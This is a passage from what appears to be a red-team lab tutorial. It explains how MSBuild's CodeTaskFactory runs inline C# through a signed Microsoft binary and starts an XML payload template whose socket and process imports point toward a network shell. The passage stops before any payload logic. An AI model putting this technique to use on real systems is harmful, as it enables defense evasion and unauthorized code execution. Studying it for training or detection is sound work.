Task 3: Build an MSBuild XML Payload Generator
MSBuild is Microsoft's build engine. Its CodeTaskFactory feature compiles and runs inline C# at build time, which red teams use to execute code through a signed Microsoft binary (MSBuild.exe). In this task you write a Python generator that produces valid MSBuild XML files.

Step 1: Create the MSBuild XML template
mkdir -p ~/lab11/msbuild_payloads
cd ~/lab11/msbuild_payloads

cat > msbuild_template.xml << 'EOF'
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <InlineTask />
  </Target>
  <UsingTask
    TaskName="InlineTask"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Diagnostics;
        using System.Net.Sockets;
        using System.IO;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class InlineTask : Task, ITask
        {
